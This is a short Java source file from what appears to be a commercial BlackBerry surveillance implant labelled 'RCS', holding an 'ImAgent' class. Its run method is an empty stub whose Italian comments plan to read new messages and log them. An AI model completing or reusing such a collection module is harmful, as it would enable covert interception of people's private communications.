/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ImAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class ImAgent.
 */
public final class ImAgent extends Agent {
    // #debug
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);

    int loop;

    /**
     * Instantiates a new im agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentStatus) {
        super(Agent.AGENT_IM, agentStatus, true, "ImAgent");
        loop = 0;
        setPeriod(1000);
    }

    /**
     * Instantiates a new im agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

        // verifica che ci siano email *nuove* da leggere

        // per ogni email da leggere

        // genera un log con la email

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
